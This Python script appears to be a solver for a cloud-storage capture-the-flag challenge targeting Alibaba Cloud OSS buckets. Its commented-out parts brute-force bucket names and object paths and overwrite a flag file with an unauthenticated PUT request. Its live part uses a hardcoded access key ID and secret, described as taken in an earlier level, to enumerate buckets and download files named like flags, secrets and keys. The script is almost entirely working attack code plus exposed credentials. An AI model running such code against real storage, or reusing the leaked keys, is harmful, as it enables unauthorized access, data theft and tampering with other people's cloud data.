# import requests
# from concurrent.futures import ThreadPoolExecutor, as_completed

# bucket_prefix = "haobachang"
# bucket_suffix = "x001.oss-cn-chengdu.aliyuncs.com"

# # 生成所有可能的桶
# buckets = [f"{bucket_prefix}{i}x{j}{bucket_suffix}" for i in range(10) for j in range(10)]

# def check_bucket(bucket_name):
#     url = f"http://{bucket_name}"
#     try:
#         resp = requests.get(url, timeout=1)
#         if resp.status_code != 404:
#             return url
#     except:
#         pass
#     return None

# # 多线程检查桶
# print("[*] 快速扫描存储桶...")
# found_buckets = []
# with ThreadPoolExecutor(max_workers=20) as executor:
#     futures = [executor.submit(check_bucket, b) for b in buckets]
#     for future in as_completed(futures):
#         result = future.result()
#         if result:
#             print(f"[+] 存在: {result}")
#             found_buckets.append(result)

# # 对找到的桶爆破路径
# paths = [f"hbc_{i:03d}" for i in range(1, 1000)]

# def check_path(bucket_url, path):
#     url = f"{bucket_url}/{path}"
#     try:
#         resp = requests.get(url, timeout=1)
#         if resp.status_code == 200:
#             print(f"  [+] {url}")
#             if 'flag' in resp.text:
#                 print(f"     内容: {resp.text[:100]}")
#     except:
#         pass

# print(f"\n[*] 爆破 {len(found_buckets)} 个桶的路径...")
# for bucket_url in found_buckets:
#     print(f"\n--- {bucket_url} ---")
#     with ThreadPoolExecutor(max_workers=30) as executor:
#         executor.map(lambda p: check_path(bucket_url, p), paths)

# import requests

# url = "http://haobachang520.oss-cn-chengdu.aliyuncs.com/9657beec-984f-4398-af89-f5376e6bec04/flag.txt"

# # 要上传的新内容（可以包含你的名字或 "test"）
# new_content = "这是一个测试文件，包含我的名字：张三。"

# # 发送 PUT 请求
# response = requests.put(url, data=new_content)

# print(f"状态码: {response.status_code}")
# if response.status_code == 200:
#     print("覆盖成功！")
# else:
#     print(f"失败，原因: {response.text}")

import oss2
from oss2 import ObjectIterator

# 上一关获取的凭证
access_key_id = "LTAI5t74gdTkSqzHFMyPNaNQ"
access_key_secret = "dmPncMOYDwOv7zla1jwOBRRd5olac2"
endpoint = "oss-cn-chengdu.aliyuncs.com"

# 可能的 bucket 列表（根据前两关推测）
buckets_to_try = [
    "haobachang520",
    "haobachang522", 
    "haobachang7x8x001",
    "haobachang0x0x001",
    "hbc618773"
]

print("[*] 开始检查存储桶...")

for bucket_name in buckets_to_try:
    print(f"\n--- 检查: {bucket_name} ---")
    auth = oss2.Auth(access_key_id, access_key_secret)
    bucket = oss2.Bucket(auth, endpoint, bucket_name)
    
    try:
        # 尝试列出文件（只需要第一个对象来测试权限）
        for obj in ObjectIterator(bucket, max_keys=1):
            print(f"[+] 可访问! 第一个文件: {obj.key}")
            break
        else:
            # 能访问但目录为空
            print("[+] 可访问，但目录为空")
        
        # 尝试下载常见的 flag 文件
        common_files = ['flag.txt', 'flag', 'hbc_015', 'secret.txt', 'key.txt']
        for filename in common_files:
            try:
                content = bucket.get_object(filename).read()
                print(f"[!!!] 找到文件 {filename}:")
                print(f"     {content[:200]}")
            except oss2.exceptions.NoSuchKey:
                pass
            except Exception as e:
                print(f"     读取 {filename} 失败: {e}")
                
    except oss2.exceptions.AccessDenied:
        print("[-] 拒绝访问 (凭证无权限)")
    except oss2.exceptions.NoSuchBucket:
        print("[-] Bucket 不存在")
    except Exception as e:
        print(f"[?] 其他错误: {e}")

print("\n[*] 扫描完成")